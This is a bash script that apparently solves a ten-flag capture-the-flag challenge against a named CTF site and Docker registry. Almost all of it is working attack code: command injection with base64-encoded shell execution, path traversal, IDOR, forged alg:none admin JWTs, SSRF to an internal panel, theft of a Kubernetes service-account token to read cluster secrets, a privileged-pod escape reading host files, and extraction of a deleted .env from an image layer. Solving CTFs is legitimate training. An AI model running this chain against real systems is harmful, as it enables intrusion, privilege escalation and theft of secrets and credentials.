#!/bin/bash
# Prints the 10 flags, one per line — nothing else.
BASE="https://ctf.seoeh.ir"
HARBOR="https://hub.hamdocker.ir"
REPO="seoeh/hamamooz_challlenges"
FLAG_RE='HAMAMOOZ\{[^}]+\}'

# run a shell command inside the backend pod via the ping injection
rce() {
  local b64
  b64=$(printf '%s' "$1" | base64 | tr -d '\n')
  curl -sk -X POST "$BASE/api/diag/ping" -H "Content-Type: application/json" \
    -d "{\"host\": \"127.0.0.1; echo $b64 | base64 -d | sh\"}" \
    | grep -aoE "$FLAG_RE" | head -n1
}

# exposed swagger schema
curl -sk "$BASE/api/schema/" | grep -aoE "$FLAG_RE" | head -n1

# hidden debug endpoint
curl -sk -H "X-Debug-Mode: true" "$BASE/api/internal/flag" | grep -aoE "$FLAG_RE" | head -n1

# path traversal
curl -sk "$BASE/api/reports/download?file=../flag.txt" | grep -aoE "$FLAG_RE" | head -n1

# IDOR on org reports
curl -sk "$BASE/api/orgs/2/reports/2" | grep -aoE "$FLAG_RE" | head -n1

# weak JWT (alg:none)
TOKEN=$(python3 -c "
import base64, json
def b(d): return base64.urlsafe_b64encode(json.dumps(d, separators=(',', ':')).encode()).rstrip(b'=').decode()
print(b({'alg':'none','typ':'JWT'}) + '.' + b({'sub':'1','role':'admin'}) + '.')
" 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" "$BASE/admin/dashboard" | grep -aoE "$FLAG_RE" | head -n1

# command injection in ping
curl -sk -X POST "$BASE/api/diag/ping" -H "Content-Type: application/json" \
  -d '{"host": "127.0.0.1; cat /opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt"}' \
  | grep -aoE "$FLAG_RE" | head -n1

# k8s secret read via the pod service-account token
rce 'python3 - <<"PY"
import urllib.request, json, base64, ssl
ctx = ssl._create_unverified_context()
tok = open("/var/run/secrets/kubernetes.io/serviceaccount/token").read().strip()
req = urllib.request.Request("https://kubernetes.default.svc/api/v1/secrets",
                             headers={"Authorization": "Bearer " + tok})
d = json.load(urllib.request.urlopen(req, context=ctx, timeout=10))
for it in d["items"]:
    data = it.get("data") or {}
    if "flag" in data:
        print(base64.b64decode(data["flag"]).decode())
PY'

# SSRF to the internal admin panel
curl -sk -X POST "$BASE/api/webhooks/test" -H "Content-Type: application/json" \
  -d '{"url": "http://admin-panel.internal-tools.svc.cluster.local/", "method": "GET"}' \
  | grep -aoE "$FLAG_RE" | head -n1

# privileged pod escape (hostPath)
rce 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); kubectl --server=https://kubernetes.default.svc --token=$TOKEN --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt exec -n escape-zone legacy-worker -- cat /host/var/lib/node-data/flag.txt'

# docker layer leak (deleted .env)
TOK=$(curl -sk "$HARBOR/v2/token?service=harbor-registry&scope=repository:$REPO:pull" \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["token"])' 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOK" \
  "$HARBOR/v2/$REPO/blobs/sha256:cad298f9538d92ea9901f8de6c41611a63d62c56e914c9bd802ff01080456041" \
  | tar xzO app/.env 2>/dev/null | grep -aoE "$FLAG_RE" | head -n1